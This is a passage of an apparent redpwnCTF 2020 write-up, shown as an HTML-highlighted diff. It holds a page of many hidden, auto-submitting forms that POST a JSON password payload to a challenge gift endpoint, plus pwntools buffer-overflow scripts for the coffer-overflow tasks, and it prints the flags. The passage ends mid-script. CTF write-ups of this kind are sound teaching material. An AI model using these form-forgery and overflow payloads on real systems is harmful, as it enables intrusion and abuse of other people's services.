+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;json&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;{&quot;password&quot;:&quot;n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn&quot;,&quot;x&quot;:&quot;&#39;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#39;x&quot;}&#39;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;text/plain&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;json&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;{&quot;password&quot;:&quot;n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn&quot;,&quot;x&quot;:&quot;&#39;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#39;x&quot;}&#39;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;text/plain&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;json&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;{&quot;password&quot;:&quot;n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn&quot;,&quot;x&quot;:&quot;&#39;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#39;x&quot;}&#39;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;text/plain&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;json&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;{&quot;password&quot;:&quot;n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn&quot;,&quot;x&quot;:&quot;&#39;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#39;x&quot;}&#39;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;text/plain&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;json&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;{&quot;password&quot;:&quot;n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn&quot;,&quot;x&quot;:&quot;&#39;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#39;x&quot;}&#39;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;text/plain&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;json&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;{&quot;password&quot;:&quot;n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn&quot;,&quot;x&quot;:&quot;&#39;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#39;x&quot;}&#39;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;text/plain&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;json&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;{&quot;password&quot;:&quot;n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn&quot;,&quot;x&quot;:&quot;&#39;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#39;x&quot;}&#39;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;text/plain&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;json&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;{&quot;password&quot;:&quot;n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn&quot;,&quot;x&quot;:&quot;&#39;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#39;x&quot;}&#39;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;text/plain&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;json&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;{&quot;password&quot;:&quot;n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn&quot;,&quot;x&quot;:&quot;&#39;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#39;x&quot;}&#39;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;iframe_container&#39;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;formresponse1&#39;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#39;350px&#39;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#39;100px&#39;</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">&#39;0&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>  
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;iframe_container&#39;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;formresponse2&#39;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#39;350px&#39;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#39;100px&#39;</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">&#39;0&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;iframe_container&#39;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;formresponse3&#39;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#39;350px&#39;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#39;100px&#39;</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">&#39;0&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;iframe_container&#39;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;formresponse4&#39;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#39;350px&#39;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#39;100px&#39;</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">&#39;0&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;iframe_container&#39;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;formresponse5&#39;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#39;350px&#39;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#39;100px&#39;</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">&#39;0&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;iframe_container&#39;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;formresponse6&#39;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#39;350px&#39;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#39;100px&#39;</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">&#39;0&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;iframe_container&#39;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;formresponse7&#39;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#39;350px&#39;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#39;100px&#39;</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">&#39;0&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;iframe_container&#39;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;formresponse8&#39;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#39;350px&#39;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#39;100px&#39;</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">&#39;0&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;iframe_container&#39;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;formresponse9&#39;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#39;350px&#39;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#39;100px&#39;</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">&#39;0&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;iframe_container&#39;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;formresponse10&#39;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#39;350px&#39;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#39;100px&#39;</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">&#39;0&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;iframe_container&#39;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;formresponse11&#39;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#39;350px&#39;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#39;100px&#39;</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">&#39;0&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;iframe_container&#39;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;formresponse12&#39;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#39;350px&#39;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#39;100px&#39;</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">&#39;0&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;iframe_container&#39;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;formresponse13&#39;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#39;350px&#39;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#39;100px&#39;</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">&#39;0&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;iframe_container&#39;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;formresponse14&#39;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#39;350px&#39;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#39;100px&#39;</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">&#39;0&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;iframe_container&#39;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;formresponse15&#39;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#39;350px&#39;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#39;100px&#39;</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">&#39;0&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;iframe_container&#39;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;formresponse16&#39;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#39;350px&#39;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#39;100px&#39;</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">&#39;0&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;iframe_container&#39;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;formresponse17&#39;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#39;350px&#39;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#39;100px&#39;</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">&#39;0&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;iframe_container&#39;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;formresponse18&#39;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#39;350px&#39;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#39;100px&#39;</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">&#39;0&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;iframe_container&#39;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;formresponse19&#39;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#39;350px&#39;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#39;100px&#39;</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">&#39;0&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;iframe_container&#39;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;formresponse20&#39;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#39;350px&#39;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#39;100px&#39;</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">&#39;0&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;iframe_container&#39;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;formresponse21&#39;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#39;350px&#39;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#39;100px&#39;</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">&#39;0&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;iframe_container&#39;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;formresponse22&#39;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#39;350px&#39;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#39;100px&#39;</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">&#39;0&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;iframe_container&#39;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;formresponse23&#39;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#39;350px&#39;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#39;100px&#39;</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">&#39;0&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;iframe_container&#39;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;formresponse24&#39;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#39;350px&#39;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#39;100px&#39;</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">&#39;0&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;iframe_container&#39;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;formresponse25&#39;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#39;350px&#39;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#39;100px&#39;</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">&#39;0&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+
+    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+        <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">index</span> <span class="o">&lt;</span> <span class="mi">12</span><span class="p">;</span> <span class="nx">index</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+          <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="nx">index</span><span class="p">].</span><span class="nx">target</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;formresponse&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="nx">index</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span>
+        <span class="p">}</span>
+        <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">index</span> <span class="o">&lt;</span> <span class="mi">12</span><span class="p">;</span> <span class="nx">index</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+          <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="nx">index</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+
+<p>I know its a bad code, but who cares about "good" code when creating exploit :v</p>
+
+<p>anyway here's the flag</p>
+
+<p>flag = <code>flag{n0_m0r3_gu3551ng}</code></p>
+
+<p>For a record, after looking at other people's writeup I just surprised that I can use XMLHttpRequest instead of doing this stupid iframe things :(</p>
+
+<h1>coffer-overflow-0</h1>
+
+<blockquote>
+  <p>Can you fill up the coffers? We even managed to find the source for you. <br />
+  nc 2020.redpwnc.tf 31199  </p>
+</blockquote>
+
+<p>just send a string with very long character and it will overflow the value of variable code. <br />
+flag : <code>flag{b0ffer_0verf10w_3asy_as_123}</code>  </p>
+
+<h1>coffer-overflow-1</h1>
+
+<blockquote>
+  <p>The coffers keep getting stronger! You'll need to use the source, Luke. <br />
+  nc 2020.redpwnc.tf 31255  </p>
+</blockquote>
+
+<p>this time we need to actually control a value, this can be done by filling the buffer until 8 bytes before rbp and fill the 8 bytes with value <code>0xcafebabe</code>  </p>
+
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">pwn</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">remote</span><span class="p">(</span><span class="s2">&quot;2020.redpwnc.tf&quot;</span><span class="p">,</span> <span class="mi">31255</span><span class="p">)</span>
+<span class="c1"># r = pwn.process(&quot;coffer-overflow-1&quot;)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">24</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+
+<p>flag : <code>flag{th1s_0ne_wasnt_pure_gu3ssing_1_h0pe}</code>    </p>
+
+<h1>coffer-overflow-2</h1>
+
+<blockquote>
+  <p>You'll have to jump to a function now!? <br />
+  nc 2020.redpwnc.tf 31908  </p>
+</blockquote>
+
+<p>this time we need to jump into <code>binFunction</code> function, this can be done by filling the buffer until it hit rbp and overflow the buffer with <code>binFunction</code> address  </p>
+
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">pwn</span>
+
+<span class="n">pad</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">16</span>
+<span class="n">win</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004006e6</span><span class="p">)</span>
+<span class="n">ret</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000040053e</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">pad</span><span class="o">+</span><span class="n">ret</span><span class="o">+</span><span class="n">win</span>
+
